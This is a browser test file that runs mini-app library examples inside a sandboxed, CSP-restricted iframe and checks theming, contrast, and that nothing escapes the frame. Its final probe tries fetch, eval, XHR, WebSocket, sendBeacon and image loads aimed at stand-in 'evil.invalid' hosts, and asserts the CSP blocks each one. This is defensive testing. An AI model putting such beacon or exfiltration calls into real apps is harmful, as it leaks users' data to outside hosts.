/**
 * Every canvas_library APP guide's example App.tsx, built by the mini-app
 * bundler (buildApp, with the real runtime's export map) and run in a real
 * browser through the mini-app frame: the frame document and its CSP header
 * (buildAppFrameHtml, buildAppFrameCsp, as the frame route serves them), the
 * real app import map (public/app-runtime/manifest.json, which names the
 * vendored /canvas-runtime/ files), inside a `sandbox="allow-scripts"`
 * iframe, as AppSandbox frames it. Each app must signal ready, report no
 * error, log no console error, load nothing outside the served runtimes,
 * and paint a picture that is not blank.
 *
 * Then the frame's limits, with the libraries in place: no fetch, no request
 * to another origin, no eval.
 *
 * Nothing here touches the network: the page's origin is made up and request
 * interception answers it from server/web/public; every other request is
 * refused and counted.
 *
 * Needs a Chrome and the built runtimes (`pnpm -C server/web build`, or its
 * `canvas-runtime`, `app-runtime` and `share-runtime` scripts). Without
 * either it skips, and says so loudly.
 */
import { existsSync, readFileSync, statSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import type { Browser, Frame, HTTPRequest } from 'puppeteer-core';
import { buildApp, type AppSource } from '@mantle/app-build';
import { THEME_ATTR, THEME_COLOURS, THEME_TEXT_COLOURS } from '@mantle/diagram-templates';
import { buildAppFrameCsp, buildAppFrameHtml } from '@mantle/share-ui/app-frame-html';
import { APP_GUIDE_LIBRARIES, appSpecifiers, guideFile } from '../builtins-canvas-library';
import { RENDER_LAUNCH_ARGS } from './sidecar';
import { findChrome } from './find-chrome';

const ROOT = path.resolve(__dirname, '../../../..');
const PUBLIC = path.join(ROOT, 'server/web/public');
const APP_MANIFEST = path.join(PUBLIC, 'app-runtime/manifest.json');
const CANVAS_MANIFEST = path.join(PUBLIC, 'canvas-runtime/manifest.json');
const SHARE_CSS = path.join(PUBLIC, 'share-runtime/styles.css');
const ORIGIN = 'https://app.render.invalid';
/** What the app frame may load, by path prefix (its CSP's). */
const SERVED = ['/app-runtime/', '/canvas-runtime/', '/share-runtime/', '/fonts/'];
const TYPES: Readonly<Record<string, string>> = {
  '.js': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json',
  '.woff2': 'font/woff2',
  '.woff': 'font/woff',
  '.ttf': 'font/ttf',
};

const chrome = findChrome(process.env.MANTLE_TEST_CHROME);
const runtimeBuilt = [APP_MANIFEST, CANVAS_MANIFEST, SHARE_CSS].every((p) => existsSync(p));
if (!chrome || !runtimeBuilt) {
  const bar = '='.repeat(72);
  console.warn(
    [
      bar,
      `APP LIBRARY EXAMPLES SKIPPED: ${!chrome ? 'no Chrome found (set MANTLE_TEST_CHROME)' : 'the app, canvas and share runtimes are not built (pnpm -C server/web build)'}.`,
      'The canvas_library app guides’ examples were not run in a browser.',
      bar,
    ].join('\n'),
  );
}

function appExampleOf(md: string): string {
  const m = /## App example\n+```tsx\n([\s\S]*?)\n```/.exec(md);
  if (!m) throw new Error('no ## App example tsx block');
  return m[1]!;
}

/** The parent: one sandboxed iframe on the frame document, and every
 *  message the frame posts kept for the test. */
const parent = (w = 960, h = 640) => `<!doctype html><html><head><meta charset="utf-8"></head>
<body style="margin:0">
<iframe id="app" sandbox="allow-scripts" src="/frame" style="border:0;width:${w}px;height:${h}px"></iframe>
<script>
window.__msgs = [];
window.addEventListener('message', function (e) {
  if (e.source !== document.getElementById('app').contentWindow) return;
  var m = e.data; if (!m || m.v !== 1) return;
  if (m.kind === 'ready' || m.kind === 'error' || m.kind === 'probe') window.__msgs.push(m);
});
</script></body></html>`;

/**
 * Installed in every frame before any of its scripts: a record of each way
 * out a library could try on its own. The network APIs (fetch, XHR,
 * WebSocket, EventSource, sendBeacon, a worker, WebRTC, a popup) are wrapped
 * to note the call, and every CSP refusal (an image or font from another
 * origin, a script, an eval) is noted from the frame's own
 * `securitypolicyviolation` event, since a refused load never becomes a
 * request this test could see.
 */
const WATCH = `(() => {
  const log = (w) => { (window.__watch = window.__watch || []).push(w); };
  window.__watch = [];
  document.addEventListener('securitypolicyviolation', (e) =>
    log('csp ' + e.effectiveDirective + ' ' + (e.blockedURI || '')));
  const wrap = (obj, key, name) => {
    const orig = obj && obj[key];
    if (typeof orig !== 'function') return;
    obj[key] = new Proxy(orig, {
      apply(t, self, args) { log(name + ' ' + String(args[0])); return Reflect.apply(t, self, args); },
      construct(t, args) { log(name + ' ' + String(args[0])); return Reflect.construct(t, args); },
    });
  };
  wrap(window, 'fetch', 'fetch');
  wrap(XMLHttpRequest.prototype, 'open', 'xhr');
  wrap(window, 'WebSocket', 'websocket');
  wrap(window, 'EventSource', 'eventsource');
  wrap(navigator, 'sendBeacon', 'beacon');
  wrap(window, 'Worker', 'worker');
  wrap(window, 'SharedWorker', 'sharedworker');
  wrap(window, 'RTCPeerConnection', 'webrtc');
  wrap(window, 'open', 'window.open');
})();`;

type Run = {
  msgs: { kind: string; message?: string; result?: unknown }[];
  consoleErrors: string[];
  refused: string[];
  /** Every path the page loaded, the frame's own requests included. */
  served: string[];
  /** What the frame tried (WATCH); null when the frame never got it. */
  watch: string[] | null;
  png: Buffer;
  /** The picture after a live theme switch (opts.switchTo). */
  pngAfter?: Buffer;
  /** opts.inspect's answer in the frame, and again after the switch. */
  inspected?: unknown;
  inspectedAfter?: unknown;
};

type RunOpts = {
  /** The <html> class baked into the frame ('' light, 'dark'). */
  cls?: string;
  /** Emulate prefers-reduced-motion, so two pictures can be compared. */
  reduce?: boolean;
  /** Post a live theme change (the host's theme message) and picture again. */
  switchTo?: string;
  settleMs?: number;
  /** The iframe's size (the default is a laptop pane). */
  frame?: { w: number; h: number };
  /** Run in the frame once settled (and again after a switch). */
  inspect?: (frame: Frame) => Promise<unknown>;
};

describe.skipIf(!chrome || !runtimeBuilt)('mini-app library examples in a real browser', () => {
  let browser: Browser;
  let runtimeExports: Record<string, string[]>;
  let imports: Record<string, string>;
  let importMapJson: string;
  /** The evidence per library, written beside the pictures (MANTLE_APP_SHOTS). */
  const report: Record<string, Record<string, unknown>> = {};
  const shots = process.env.MANTLE_APP_SHOTS;

  beforeAll(async () => {
    const manifest = JSON.parse(readFileSync(APP_MANIFEST, 'utf8')) as {
      imports: Record<string, string>;
      exports: Record<string, string[]>;
    };
    runtimeExports = manifest.exports;
    imports = manifest.imports;
    // As server/web/lib/app-frame.ts reads it.
    importMapJson = JSON.stringify({ imports: manifest.imports });
    const puppeteer = (await import('puppeteer-core')).default;
    browser = await puppeteer.launch({
      executablePath: chrome!,
      headless: true,
      args: [
        ...RENDER_LAUNCH_ARGS,
        '--no-first-run',
        '--use-angle=swiftshader',
        ...(process.platform === 'linux' ? ['--no-sandbox'] : []),
      ],
    });
  }, 60_000);

  afterAll(async () => {
    await browser?.close();
    if (shots) writeFileSync(path.join(shots, 'report.json'), JSON.stringify(report, null, 2));
  });

  /** Answer the made-up origin from public/, refuse and record the rest. */
  function serve(frameHtml: string, refused: string[], served: string[], parentHtml: string) {
    return async (req: HTTPRequest) => {
      const url = new URL(req.url());
      if (url.origin !== ORIGIN) {
        refused.push(req.url());
        return req.abort('blockedbyclient');
      }
      // The browser's own icon request, not the app's.
      if (url.pathname === '/favicon.ico') return req.respond({ status: 204, body: '' });
      if (url.pathname === '/parent') {
        return req.respond({ status: 200, contentType: 'text/html', body: parentHtml });
      }
      if (url.pathname === '/frame') {
        return req.respond({
          status: 200,
          contentType: 'text/html; charset=utf-8',
          headers: { 'content-security-policy': buildAppFrameCsp(ORIGIN) },
          body: frameHtml,
        });
      }
      const file = path.normalize(path.join(PUBLIC, decodeURIComponent(url.pathname)));
      if (SERVED.some((p) => url.pathname.startsWith(p)) && file.startsWith(PUBLIC + path.sep)) {
        if (existsSync(file)) {
          served.push(url.pathname);
          return req.respond({
            status: 200,
            // An opaque-origin frame's module and font loads are CORS loads.
            headers: { 'access-control-allow-origin': '*' },
            contentType: TYPES[path.extname(file)] ?? 'application/octet-stream',
            body: readFileSync(file),
          });
        }
      }
      refused.push(req.url());
      return req.abort('blockedbyclient');
    };
  }

  async function run(source: AppSource, opts: RunOpts = {}): Promise<Run> {
    const built = await buildApp(source, { runtimeExports });
    expect(built.errors, 'build errors').toEqual([]);
    expect(built.ok).toBe(true);
    const frameHtml = buildAppFrameHtml({
      bundleCode: built.code!,
      appCss: built.css ?? '',
      importMapJson,
      cls: opts.cls ?? '',
      colorTheme: null,
      viewport: true,
    });
    const page = await browser.newPage();
    const consoleErrors: string[] = [];
    const refused: string[] = [];
    const served: string[] = [];
    try {
      const size = opts.frame ?? { w: 960, h: 640 };
      await page.setViewport({ width: size.w + 20, height: size.h + 20 });
      if (opts.reduce) {
        await page.emulateMediaFeatures([{ name: 'prefers-reduced-motion', value: 'reduce' }]);
      }
      await page.evaluateOnNewDocument(WATCH);
      page.on('console', (m) => {
        if (m.type() === 'error') consoleErrors.push(m.text());
      });
      page.on('pageerror', (e) => consoleErrors.push(String(e)));
      await page.setRequestInterception(true);
      page.on('request', serve(frameHtml, refused, served, parent(size.w, size.h)));
      await page.goto(`${ORIGIN}/parent`, { waitUntil: 'load', timeout: 20_000 });
      await page.waitForFunction(
        () =>
          (window as unknown as { __msgs: { kind: string }[] }).__msgs.some(
            (m) => m.kind === 'ready' || m.kind === 'error',
          ),
        { timeout: 20_000 },
      );
      await new Promise((r) => setTimeout(r, opts.settleMs ?? 1500));
      const msgs = (await page.evaluate(
        () => (window as unknown as { __msgs: unknown[] }).__msgs,
      )) as Run['msgs'];
      const frame = page.frames().find((f) => f.url().endsWith('/frame'));
      const watch = frame
        ? ((await frame.evaluate(
            () => (window as unknown as { __watch?: string[] }).__watch ?? null,
          )) as string[] | null)
        : null;
      const inspected = frame && opts.inspect ? await opts.inspect(frame) : undefined;
      const el = await page.$('#app');
      const png = Buffer.from(await el!.screenshot({ type: 'png' }));
      let pngAfter: Buffer | undefined;
      let inspectedAfter: unknown;
      if (opts.switchTo !== undefined) {
        await page.evaluate((cls: string) => {
          const f = document.getElementById('app') as HTMLIFrameElement;
          f.contentWindow!.postMessage({ v: 1, kind: 'theme', cls }, '*');
        }, opts.switchTo);
        await new Promise((r) => setTimeout(r, 800));
        pngAfter = Buffer.from(await el!.screenshot({ type: 'png' }));
        if (frame && opts.inspect) inspectedAfter = await opts.inspect(frame);
      }
      return {
        msgs,
        consoleErrors,
        refused,
        served,
        watch,
        png,
        pngAfter,
        inspected,
        inspectedAfter,
      };
    } finally {
      await page.close();
    }
  }

  /** Sample the pictures on one grid: distinct colours of the first, and
   *  the share of points where the two differ (by more than antialiasing). */
  async function sample(a: Buffer, b?: Buffer): Promise<{ colours: number; differ: number }> {
    const page = await browser.newPage();
    try {
      return await page.evaluate(
        async (srcA: string, srcB: string | null) => {
          const pixels = async (src: string) => {
            const img = new Image();
            img.src = src;
            await img.decode();
            const c = document.createElement('canvas');
            c.width = img.naturalWidth;
            c.height = img.naturalHeight;
            const g = c.getContext('2d')!;
            g.drawImage(img, 0, 0);
            const out: number[][] = [];
            for (let y = 0; y < c.height; y += Math.max(1, Math.floor(c.height / 80))) {
              for (let x = 0; x < c.width; x += Math.max(1, Math.floor(c.width / 120))) {
                out.push(Array.from(g.getImageData(x, y, 1, 1).data.slice(0, 3)));
              }
            }
            return out;
          };
          const pa = await pixels(srcA);
          const colours = new Set(pa.map((p) => p.join(','))).size;
          if (!srcB) return { colours, differ: 0 };
          const pb = await pixels(srcB);
          let n = 0;
          pa.forEach((p, i) => {
            const q = pb[i]!;
            if (Math.abs(p[0]! - q[0]!) + Math.abs(p[1]! - q[1]!) + Math.abs(p[2]! - q[2]!) > 24)
              n++;
          });
          return { colours, differ: n / pa.length };
        },
        `data:image/png;base64,${a.toString('base64')}`,
        b ? `data:image/png;base64,${b.toString('base64')}` : null,
      );
    } finally {
      await page.close();
    }
  }

  for (const lib of APP_GUIDE_LIBRARIES) {
    const example = () =>
      appExampleOf(
        readFileSync(path.join(ROOT, 'docs/canvas-libraries/app', guideFile(lib)), 'utf8'),
      );

    it(`${lib.name}: builds, runs clean, reaches nothing outside the runtime, no eval, not blank`, async () => {
      const r = await run({ entry: 'App.tsx', files: { 'App.tsx': example() } });
      if (shots) writeFileSync(path.join(shots, `${lib.name}.png`), r.png);
      const specs = appSpecifiers(lib);
      report[lib.name] = {
        ...report[lib.name],
        imports: specs,
        files: specs.map((s) => imports[s]),
        bytes: specs.map((s) => statSync(path.join(PUBLIC, imports[s]!)).size),
        served: [...new Set(r.served)].sort(),
        watch: r.watch,
      };
      expect(
        r.msgs.filter((m) => m.kind === 'error'),
        `${lib.name} reported`,
      ).toEqual([]);
      expect(
        r.msgs.some((m) => m.kind === 'ready'),
        `${lib.name} ready`,
      ).toBe(true);
      expect(r.consoleErrors, `${lib.name} console`).toEqual([]);
      // (a) and (b): no request outside the served runtimes, no network API
      // called, and no CSP refusal of any kind (an image, a font or a script
      // from elsewhere, an eval).
      expect(r.refused, `${lib.name} refused requests`).toEqual([]);
      expect(r.watch, `${lib.name}: the frame's watch`).toEqual([]);
      // Its own module was served from the runtime, so the run proves something.
      for (const s of specs) expect(r.served, s).toContain(imports[s]);
      expect((await sample(r.png)).colours, `${lib.name} is blank`).toBeGreaterThan(3);
    }, 60_000);

    it(`${lib.name}: follows the theme, baked and on a live switch`, async () => {
      const files = { 'App.tsx': example() };
      const dark = await run({ entry: 'App.tsx', files }, { cls: 'dark', reduce: true });
      const live = await run({ entry: 'App.tsx', files }, { reduce: true, switchTo: 'dark' });
      if (shots) {
        writeFileSync(path.join(shots, `${lib.name}.dark.png`), dark.png);
        writeFileSync(path.join(shots, `${lib.name}.live-dark.png`), live.pngAfter!);
      }
      for (const r of [dark, live]) {
        expect(r.consoleErrors, `${lib.name} console`).toEqual([]);
        expect(r.watch, `${lib.name} watch`).toEqual([]);
      }
      // The dark picture is not the light one...
      const lightVsDark = (await sample(live.png, dark.png)).differ;
      // ...and a live switch ends where a dark load starts: the library's
      // own colours were read again, not kept from the light theme.
      const liveVsDark = (await sample(live.pngAfter!, dark.png)).differ;
      report[lib.name] = { ...report[lib.name], lightVsDark, liveVsDark };
      expect(lightVsDark, `${lib.name}: dark differs from light`).toBeGreaterThan(0.3);
      expect(liveVsDark, `${lib.name}: a live switch matches a dark load`).toBeLessThan(0.02);
    }, 90_000);
  }

  /**
   * In the frame: every element of the themed drawing that carries a house
   * colour is painted the colour of its token (the token resolved on a probe
   * in the same drawing), no painted colour is a house colour (checked in
   * dark), and every mark (text, line, symbol) clears its contrast on the
   * card: 4.5 for text, 3 for a line or a symbol.
   */
  const inspectDrawing = (frame: Frame) =>
    frame.evaluate(
      (map: Record<string, string>, textMap: Record<string, string>, attr: string) => {
        const svg = document.querySelector(`svg[${attr}]`);
        if (!svg) return null;
        const probe = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
        svg.appendChild(probe);
        const resolve = (prop: 'fill' | 'stroke', css: string) => {
          probe.setAttribute('style', `${prop}:${css}`);
          return getComputedStyle(probe)[prop];
        };
        const g = document.createElement('canvas').getContext('2d', { willReadFrequently: true })!;
        const rgba = (c: string) => {
          g.clearRect(0, 0, 1, 1);
          g.fillStyle = '#000';
          g.fillStyle = c;
          g.fillRect(0, 0, 1, 1);
          const d = g.getImageData(0, 0, 1, 1).data;
          return [d[0]!, d[1]!, d[2]!, d[3]! / 255];
        };
        const card = rgba(resolve('fill', 'var(--card)'));
        const lum = (c: number[]) => {
          const ch = c.slice(0, 3).map((v, i) => {
            const mixed = (v * c[3]! + card[i]! * (1 - c[3]!)) / 255;
            return mixed <= 0.03928 ? mixed / 12.92 : ((mixed + 0.055) / 1.055) ** 2.4;
          });
          return 0.2126 * ch[0]! + 0.7152 * ch[1]! + 0.0722 * ch[2]!;
        };
        const ratio = (c: number[]) => {
          const a = lum(c);
          const b = lum([...card.slice(0, 3), 1]);
          return (Math.max(a, b) + 0.05) / (Math.min(a, b) + 0.05);
        };
        const house = Object.keys(map).map((h) => [h, rgba(h)] as const);
        const marks = new Set(
          Object.entries(map)
            .filter(([, t]) => /^var\(--(foreground|muted-foreground|primary|chart-\d)\)$/.test(t))
            .map(([h]) => h),
        );
        const mismatched: string[] = [];
        const houseLeft: string[] = [];
        const lowContrast: string[] = [];
        let checked = 0;
        for (const el of svg.querySelectorAll('[fill],[stroke]')) {
          if (el === probe) continue;
          for (const prop of ['fill', 'stroke'] as const) {
            const value = el.getAttribute(prop);
            if (!value || !(value in map)) continue;
            checked++;
            const got = getComputedStyle(el)[prop];
            const css =
              el.tagName === 'text' && prop === 'fill' && value in textMap
                ? textMap[value]!
                : map[value]!;
            const want = resolve(prop, css);
            const what = `<${el.tagName}> ${prop} ${value}`;
            if (got !== want) mismatched.push(`${what}: ${got}, not ${want}`);
            const c = rgba(got);
            for (const [h, hc] of house) {
              if (c.every((v, i) => Math.abs(v - hc[i]!) <= (i === 3 ? 0.02 : 2))) {
                houseLeft.push(`${what} paints the house ${h}`);
              }
            }
            if (marks.has(value) && el.tagName !== 'svg') {
              const r = ratio(c);
              const need = el.tagName === 'text' ? 4.5 : 3;
              if (r < need) lowContrast.push(`${what}: ${r.toFixed(2)} < ${need}`);
            }
          }
        }
        probe.remove();
        return {
          checked,
          mismatched: [...new Set(mismatched)],
          houseLeft: [...new Set(houseLeft)],
          lowContrast: [...new Set(lowContrast)],
        };
      },
      THEME_COLOURS as Record<string, string>,
      THEME_TEXT_COLOURS as Record<string, string>,
      THEME_ATTR,
    ) as Promise<{
      checked: number;
      mismatched: string[];
      houseLeft: string[];
      lowContrast: string[];
    } | null>;

  for (const [name, file, frame] of [
    ['flow', 'packages/diagram-templates/samples/flow-architecture.json', { w: 1700, h: 560 }],
    ['pid', 'packages/diagram-templates/test/pid-all-parts.json', { w: 3500, h: 1500 }],
  ] as const) {
    it(`the ${name} template follows the app theme: light, dark, and a live switch`, async () => {
      const data = readFileSync(path.join(ROOT, file), 'utf8');
      const files = {
        'App.tsx': [
          "import { useMemo } from 'react';",
          "import { render, domMeasurer } from '@mantle/diagram-templates/browser';",
          `const DATA = ${data};`,
          'export default function App() {',
          "  const out = useMemo(() => render(DATA.template, DATA, domMeasurer(document), { theme: 'tokens' }), []);",
          "  if (!out.ok) return <pre>{out.errors.join('\\n')}</pre>;",
          '  return <div dangerouslySetInnerHTML={{ __html: out.svg }} />;',
          '}',
        ].join('\n'),
      };
      const opts = { reduce: true, frame, inspect: inspectDrawing } as const;
      const light = await run({ entry: 'App.tsx', files }, opts);
      const dark = await run({ entry: 'App.tsx', files }, { ...opts, cls: 'dark' });
      const live = await run({ entry: 'App.tsx', files }, { ...opts, switchTo: 'dark' });
      if (shots) {
        writeFileSync(path.join(shots, `template-${name}.light.png`), light.png);
        writeFileSync(path.join(shots, `template-${name}.dark.png`), dark.png);
        writeFileSync(path.join(shots, `template-${name}.live-dark.png`), live.pngAfter!);
      }
      type Seen = {
        checked: number;
        mismatched: string[];
        houseLeft: string[];
        lowContrast: string[];
      };
      const seen = {
        light: light.inspected as Seen,
        dark: dark.inspected as Seen,
        live: live.inspectedAfter as Seen,
      };
      report[`template-${name}`] = {
        checked: seen.dark.checked,
        lowContrastDark: seen.dark.lowContrast,
        lowContrastLight: seen.light.lowContrast,
      };
      for (const r of [light, dark, live]) {
        expect(r.consoleErrors, `${name} console`).toEqual([]);
        expect(r.watch, `${name} watch`).toEqual([]);
      }
      for (const [when, v] of Object.entries(seen)) {
        expect(v, `${name} ${when}: the themed drawing is in the frame`).not.toBeNull();
        expect(v.checked, `${name} ${when}: elements checked`).toBeGreaterThan(50);
        // Painted in the token of its role, in light, dark and after a switch.
        expect(v.mismatched, `${name} ${when}`).toEqual([]);
      }
      // Every mark readable on the card, light and dark; and in dark
      // nothing is left from the light house style.
      for (const when of ['light', 'dark', 'live'] as const) {
        expect(seen[when].lowContrast, `${name} ${when}: contrast`).toEqual([]);
      }
      for (const when of ['dark', 'live'] as const) {
        expect(seen[when].houseLeft, `${name} ${when}: house colours`).toEqual([]);
      }
      // A live switch ends where a dark load starts.
      expect((await sample(live.pngAfter!, dark.png)).differ).toBeLessThan(0.02);
      expect((await sample(light.png, dark.png)).differ).toBeGreaterThan(0.3);
    }, 120_000);
  }

  it('only d3 and echarts carry an eval path, and each is named', () => {
    // Every library module an app can import, scanned for the two ways to
    // compile code at run time. The app frame has no 'unsafe-eval', so a
    // call throws EvalError (catchable; the frame lives on, next test).
    //  - d3: dsv's objectConverter (csvParse, tsvParse, dsvFormat().parse)
    //  - echarts: parseJSON's fallback when there is no JSON.parse (never in
    //    a browser this frame runs in)
    const withEval = Object.entries(imports)
      .filter(([, url]) => url.endsWith('.js'))
      .filter(([, url]) =>
        /new Function\(|[^.\w]eval\(/.test(readFileSync(path.join(PUBLIC, url), 'utf8')),
      )
      .map(([spec]) => spec)
      .sort();
    expect(withEval).toEqual(['d3', 'echarts']);
  });

  it('the frame still has no network and no eval, with the libraries loaded', async () => {
    const probe = [
      "import { useEffect } from 'react';",
      "import * as echarts from 'echarts';",
      "import * as d3 from 'd3';",
      'async function check() {',
      '  const out: Record<string, string> = { echarts: typeof echarts.init };',
      "  try { await fetch('/api/version'); out.fetch = 'allowed'; } catch { out.fetch = 'refused'; }",
      "  try { new Function('return 1')(); out.eval = 'allowed'; } catch (e) { out.eval = (e as Error).name; }",
      // A library's eval path: a catchable EvalError, and the app runs on.
      "  try { d3.csvParse('a,b\\n1,2'); out.csvParse = 'allowed'; } catch (e) { out.csvParse = (e as Error).name; }",
      "  out.csvParseRows = String(d3.csvParseRows('a,b\\n1,2').length);",
      "  try { const x = new XMLHttpRequest(); x.open('GET', 'https://evil.invalid/xhr'); x.send(); out.xhr = 'sent'; } catch { out.xhr = 'refused'; }",
      "  try { new WebSocket('wss://evil.invalid/ws'); out.ws = 'opened'; } catch { out.ws = 'refused'; }",
      "  try { out.beacon = String(navigator.sendBeacon('https://evil.invalid/beacon', 'd')); } catch { out.beacon = 'refused'; }",
      // A script from another origin, and a runtime path no bundle names,
      // loaded the way the frame would run them (a script element: the
      // bundler refuses an import() with a computed path before the frame
      // sees it). The CSP decides.
      "  const load = (src: string) => new Promise<string>((ok) => { const s = document.createElement('script'); s.type = 'module'; s.src = src; s.onload = () => ok('loaded'); s.onerror = () => ok('refused'); document.head.appendChild(s); });",
      "  out.cdn = await load('https://cdn.invalid/x.js');",
      "  out.missing = await load('/canvas-runtime/nope.js');",
      "  const img = new Image(); img.src = 'https://evil.invalid/p.png';",
      "  window.parent.postMessage({ v: 1, kind: 'probe', result: out }, '*');",
      '}',
      'export default function App() {',
      '  useEffect(() => { void check(); }, []);',
      '  return <p>probe</p>;',
      '}',
    ].join('\n');
    const r = await run({ entry: 'App.tsx', files: { 'App.tsx': probe } });
    const result = r.msgs.find((m) => m.kind === 'probe')?.result;
    expect(result).toEqual({
      echarts: 'function',
      fetch: 'refused',
      eval: 'EvalError',
      csvParse: 'EvalError',
      csvParseRows: '2',
      // XHR and WebSocket construct; the CSP refuses the connection itself.
      xhr: 'sent',
      ws: 'opened',
      // sendBeacon only queues: true here, then the CSP refuses the send.
      beacon: 'true',
      cdn: 'refused',
      missing: 'refused',
    });
    // Each try was refused by the CSP before a request left the frame; only
    // the same-origin runtime path reached the server (a 404).
    expect(r.refused).toEqual([`${ORIGIN}/canvas-runtime/nope.js`]);
    const csp = (r.watch ?? []).filter((w) => w.startsWith('csp '));
    for (const want of [
      /csp connect-src .*\/api\/version/,
      /csp script-src eval/,
      /csp connect-src https:\/\/evil\.invalid\/xhr/,
      /csp connect-src wss:\/\/evil\.invalid\/ws/,
      /csp connect-src https:\/\/evil\.invalid\/beacon/,
      /csp script-src-elem https:\/\/cdn\.invalid/,
      /csp img-src https:\/\/evil\.invalid/,
    ]) {
      expect(
        csp.some((w) => want.test(w)),
        `${want} in ${csp.join(' | ')}`,
      ).toBe(true);
    }
  }, 60_000);
});
